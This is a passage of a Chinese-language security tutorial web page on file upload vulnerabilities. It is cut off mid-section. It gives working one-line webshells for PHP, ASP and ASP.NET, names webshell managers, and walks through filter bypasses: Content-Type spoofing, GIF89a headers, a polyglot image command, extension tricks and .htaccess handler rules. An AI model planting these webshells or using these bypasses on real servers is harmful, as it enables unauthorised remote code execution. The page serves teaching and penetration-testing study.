
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.3">
    
    
      
        <title>文件上传漏洞 - Learn Security</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.edf004c2.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
        
          
          
          <meta name="theme-color" content="#02a6f2">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="light-blue" data-md-color-accent="">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#_1" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../.." title="Learn Security" class="md-header__button md-logo" aria-label="Learn Security" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Learn Security
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              文件上传漏洞
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Learn Security" class="md-nav__button md-logo" aria-label="Learn Security" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    Learn Security
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Learn Security
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          Poc
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Poc" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Poc
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../poc/webmin/" class="md-nav__link">
        Webmin
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          Tools
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Tools" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Tools
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../tools/burpsuite/" class="md-nav__link">
        Burpsuite 简介
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../tools/info_collect/" class="md-nav__link">
        信息收集
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../tools/msf/" class="md-nav__link">
        Metasploit-Framework 简介
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../tools/xray/" class="md-nav__link">
        Xray 漏洞扫描
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Web
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Web" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Web
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../authentication_attack/" class="md-nav__link">
        Authentication attack
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../cookie_session/" class="md-nav__link">
        Cookie session
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../csrf/" class="md-nav__link">
        CSRF
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../file_include/" class="md-nav__link">
        文件包含漏洞
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          文件上传漏洞
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        文件上传漏洞
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#webshell" class="md-nav__link">
    WebShell简介
  </a>
  
    <nav class="md-nav" aria-label="WebShell简介">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    一句话木马
  </a>
  
    <nav class="md-nav" aria-label="一句话木马">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    php 一句话木马
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#asp" class="md-nav__link">
    ASP 一句话木马
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aspnet" class="md-nav__link">
    ASP.NET
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#webshell_1" class="md-nav__link">
    WebShell管理工具
  </a>
  
    <nav class="md-nav" aria-label="WebShell管理工具">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    中国蚁剑
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    冰蝎
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    哥斯拉
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    文件上传漏洞概述
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    文件上传漏洞绕过
  </a>
  
    <nav class="md-nav" aria-label="文件上传漏洞绕过">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    文件上传功能验证流程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#javascript" class="md-nav__link">
    客户端 JavaScript 验证
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mime" class="md-nav__link">
    服务端 MIME 类型验证
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#-" class="md-nav__link">
    服务器文件内容验证-文件头
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#-_1" class="md-nav__link">
    服务端文件扩展名验证-黑名单
  </a>
  
    <nav class="md-nav" aria-label="服务端文件扩展名验证-黑名单">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    后缀名大小写绕过
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    重写绕过
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    特殊可解析后缀绕过
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#htaccess" class="md-nav__link">
    .htaccess 绕过
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows" class="md-nav__link">
    操作系统特性绕过(windows)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#-_2" class="md-nav__link">
    服务端文件扩展名验证-黑名单绕过
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    中间件文件解析漏洞
  </a>
  
    <nav class="md-nav" aria-label="中间件文件解析漏洞">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#apache" class="md-nav__link">
    Apache 解析漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iis60" class="md-nav__link">
    IIS6.0 解析漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nginx" class="md-nav__link">
    Nginx 解析漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nginx-cve-2013-4547" class="md-nav__link">
    Nginx 文件名逻辑漏洞（CVE-2013-4547）
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    文件上传漏洞防御
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    文件上传漏洞练习
  </a>
  
    <nav class="md-nav" aria-label="文件上传漏洞练习">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pass-01" class="md-nav__link">
    Pass-01
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../java_deserialization/" class="md-nav__link">
        Java deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../middleware/" class="md-nav__link">
        常见中间件及漏洞
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../sql_injection/" class="md-nav__link">
        SQL 注入漏洞
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#webshell" class="md-nav__link">
    WebShell简介
  </a>
  
    <nav class="md-nav" aria-label="WebShell简介">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    一句话木马
  </a>
  
    <nav class="md-nav" aria-label="一句话木马">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    php 一句话木马
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#asp" class="md-nav__link">
    ASP 一句话木马
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aspnet" class="md-nav__link">
    ASP.NET
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#webshell_1" class="md-nav__link">
    WebShell管理工具
  </a>
  
    <nav class="md-nav" aria-label="WebShell管理工具">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    中国蚁剑
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    冰蝎
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    哥斯拉
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    文件上传漏洞概述
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    文件上传漏洞绕过
  </a>
  
    <nav class="md-nav" aria-label="文件上传漏洞绕过">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    文件上传功能验证流程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#javascript" class="md-nav__link">
    客户端 JavaScript 验证
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mime" class="md-nav__link">
    服务端 MIME 类型验证
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#-" class="md-nav__link">
    服务器文件内容验证-文件头
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#-_1" class="md-nav__link">
    服务端文件扩展名验证-黑名单
  </a>
  
    <nav class="md-nav" aria-label="服务端文件扩展名验证-黑名单">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    后缀名大小写绕过
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    重写绕过
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    特殊可解析后缀绕过
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#htaccess" class="md-nav__link">
    .htaccess 绕过
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows" class="md-nav__link">
    操作系统特性绕过(windows)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#-_2" class="md-nav__link">
    服务端文件扩展名验证-黑名单绕过
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    中间件文件解析漏洞
  </a>
  
    <nav class="md-nav" aria-label="中间件文件解析漏洞">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#apache" class="md-nav__link">
    Apache 解析漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iis60" class="md-nav__link">
    IIS6.0 解析漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nginx" class="md-nav__link">
    Nginx 解析漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nginx-cve-2013-4547" class="md-nav__link">
    Nginx 文件名逻辑漏洞（CVE-2013-4547）
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    文件上传漏洞防御
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    文件上传漏洞练习
  </a>
  
    <nav class="md-nav" aria-label="文件上传漏洞练习">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pass-01" class="md-nav__link">
    Pass-01
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                

<h1 id="_1">文件上传漏洞</h1>
<h2 id="webshell">WebShell简介</h2>
<p>WebShell 简称网页后门, 是行在 Web 应用之上的远程控制程序. </p>
<p>WebShell 其实就是一张网页, 由 PHP、JSP、ASP、ASP.NET 等这类 Web 应用程序语言开发, 但 WebShell 并不具备常见网页的功能, 例如登录、注册、信息展示等功能, 一般会具备文件管理、端口扫描、提权、获取系统信息等功能. 拥有较完整功能的 WebShell, 我们一般称为大马. 功能简易的 Webshell 称为小马. 除此之外还存在一句话木马、菜刀马、脱库马等名词, 是对于 WebShell 功能或者特性的简称。</p>
<h3 id="_2">一句话木马</h3>
<h4 id="php">php 一句话木马</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">x</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>获取 POST 请求参数中 x 的值。例如 POST 请求中传递<code>x=phpinfo();</code> 那么<code>$_POST[x]</code>就等同于 <code>phpinfo();</code></p>
<p><code>eval()</code> 将字符串当作 PHP 代码执行。例如 <code>eval('phpinfo();'), 其中</code>phpinfo();`会被当做PHP代码去执行。</p>
<p><code>@</code> 是错误控制运算符，当放置在一个PHP表达式前时，该表达式产生的任何错误信息都被忽略掉。</p>
<h4 id="asp">ASP 一句话木马</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a>&lt;%eval request(&quot;x&quot;)%&gt;
</code></pre></div>
<h4 id="aspnet">ASP.NET</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;
</code></pre></div>
<h2 id="webshell_1">WebShell管理工具</h2>
<h3 id="_3">中国蚁剑</h3>
<ul>
<li><a href="https://github.com/AntSwordProject/AntSword-Loader">Github-加载器</a></li>
<li><a href="https://github.com/AntSwordProject/antSword">Github-主程序</a></li>
<li><a href="https://www.yuque.com/antswordproject/antsword">官方文档</a></li>
</ul>
<p>中国蚁剑是一款开源的跨平台网站管理工具，也是一款WebShell管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。中国蚁剑的核心代码模板均改自中国菜刀。</p>
<h3 id="_4">冰蝎</h3>
<p><a href="https://github.com/rebeyond/Behinder">Github</a></p>
<h3 id="_5">哥斯拉</h3>
<p><a href="https://github.com/BeichenDream/Godzilla">Github</a></p>
<h2 id="_6">文件上传漏洞概述</h2>
<p>大部分站点都具有文件上传功能, 如头像修改, 文章编辑, 附件上传等, 文件上传功能的作用是将本地文件上传至服务器上进行保存。</p>
<p>文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此
功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。</p>
<h2 id="_7">文件上传漏洞绕过</h2>
<h3 id="_8">文件上传功能验证流程</h3>
<ul>
<li>客户端 JavaScript 验证 </li>
<li>服务端 MIME 类型验证(Content-Type)</li>
<li>服务端文件扩展名验证</li>
<li>黑名单</li>
<li>白名单</li>
<li>服务器文件内容验证</li>
<li>文件头(文件幻数)</li>
<li>文件加载检测</li>
</ul>
<h3 id="javascript">客户端 JavaScript 验证</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-3-2" name="__codelineno-3-2"></a>  <span class="kd">function</span> <span class="nx">checkUpload</span><span class="p">(</span><span class="nx">fileobj</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-3-3" name="__codelineno-3-3"></a>    <span class="kd">var</span> <span class="nx">fileArr</span> <span class="o">=</span> <span class="nx">fileobj</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">);</span> <span class="c1">//对文件名进行处理</span>
<a id="__codelineno-3-4" name="__codelineno-3-4"></a>    <span class="kd">var</span> <span class="nx">ext</span> <span class="o">=</span> <span class="nx">fileArr</span><span class="p">[</span><span class="nx">fileArr</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mf">1</span><span class="p">];</span> <span class="c1">//得到文件扩展名</span>
<a id="__codelineno-3-5" name="__codelineno-3-5"></a>    <span class="k">if</span> <span class="p">(</span><span class="nx">ext</span> <span class="o">!=</span> <span class="s1">&#39;gif&#39;</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-3-6" name="__codelineno-3-6"></a>      <span class="c1">//验证扩展名</span>
<a id="__codelineno-3-7" name="__codelineno-3-7"></a>      <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Only upload GIF images.&#39;</span><span class="p">);</span>
<a id="__codelineno-3-8" name="__codelineno-3-8"></a>      <span class="nx">fileobj</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="c1">//清除数据</span>
<a id="__codelineno-3-9" name="__codelineno-3-9"></a>    <span class="p">}</span>
<a id="__codelineno-3-10" name="__codelineno-3-10"></a>  <span class="p">}</span>
<a id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="mime">服务端 MIME 类型验证</h3>
<p>MIME 类型是描述消息内容类型的因特网标准。</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="x">//检测Content-type</span>
<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="x">if($_FILES[&#39;fupload&#39;][&#39;type&#39;]!=&quot;image/gif&quot;)</span>
<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="x">{</span>
<a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="x">  exit(&quot;Only upload GIF images.&quot;);</span>
<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="x">}</span>
</code></pre></div>
<p>利用 Burpsuite 抓包，将报文中的Content-Type改成允许的类型即可绕过</p>
<ul>
<li><code>Content-Type:image/gif</code></li>
<li><code>Content-Type:image/jpg</code></li>
<li><code>Content-Type:image/png</code></li>
</ul>
<h3 id="-">服务器文件内容验证-文件头</h3>
<p>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。</p>
<p>常见文件幻数</p>
<ul>
<li>JPG: <code>FF D8 FF E0 00 10 4A 46 49 46</code></li>
<li>GIF: <code>47 49 46 38 39 61 (GlF89a)</code></li>
<li>PNG: <code>89 50 4E 47</code></li>
</ul>
<p>通过在 Burpsuite 抓包, 在文件内容前添加 <code>GIF89a</code> 字段可以绕过, 在图片文件结尾追加 webshell 字段也可以实现绕过. </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a>copy /b logo.jpg + shell.php shell.jpg
</code></pre></div>
<h3 id="-_1">服务端文件扩展名验证-黑名单</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="x">//检测后缀名</span>
<a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="x">$black_ext = explode(&quot;|&quot;, &quot;asp|asa|cer|cdx|aspx|ashx|ascx|asax|php|php2|php3|php4|php5|asis|htaccess|htm|html|shtml|pwml|phtml|phtm|js|jsp|vbs|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini&quot;); //转化为数组</span>
<a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="x">if(in_array($file_ext,$black_ext))</span>
<a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="x">{</span>
<a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="x">  exit(&quot;Only upload GIF images.&quot;);</span>
<a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="x">}</span>
</code></pre></div>
<h4 id="_9">后缀名大小写绕过</h4>
<p>服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，在 Windows 操作系统中大小写不敏感，所以 .pHp 仍会被当成 PHP 文件解析. </p>
<h4 id="_10">重写绕过</h4>
<p>服务端将黑名单的后缀名替换为空，但仅进行一次。上传.phphpp后缀，替换php一 次为空，则后缀为.php。</p>
<h4 id="_11">特殊可解析后缀绕过</h4>
<p>黑名单规则不严谨，在某些特定环境中某些特殊后缀名仍会被当做PHP文件解析。如 <code>phplphp2|php3|php4|php5|php6|php7|pht|phtm|phtml</code> 等, 基于 debian 和 ubuntu 的 apt-get 安装 apache，默认对于文件的解析规则如下:</p>
<p><img alt="" src="https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/file_upload/apt_install_apache.png" /></p>
<h4 id="htaccess">.htaccess 绕过</h4>
<p>在 Apache 里，这个文件作为一个配置文件，用来控制所在目录的访问权限以及解析设置。通过设置可以将该目录下的所有文件作为php文件来解析, <code>.htaccess</code>可以写入Apache配置信息，改变当前目录以及子目录的 Apache 配置。</p>
<p>此方法绕过需要配置上允许<code>.htaccess生效</code> </p>
<ul>
<li>Apache开启 rewrite 模块</li>
<li>Apache配置文件为 <code>AllowOverride All</code>（默认为None）</li>
</ul>
<p>以下配置可以让 shell.jpg 作为 php 脚本解析
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>&lt;FilesMatch &quot;.jpg&quot;&gt;
<a id="__codelineno-7-2" name="__codelineno-7-2"></a>SetHandler application/x-httpd-php
<a id="__codelineno-7-3" name="__codelineno-7-3"></a>&lt;/FilesMatch&gt;
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>AddType application/x-httpd-php .gif
</code></pre></div></p>
<h4 id="windows">操作系统特性绕过(windows)</h4>
<p>利用 window 对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范，在最后生成文件时，字符会被自动去除。</p>
<table>
<thead>
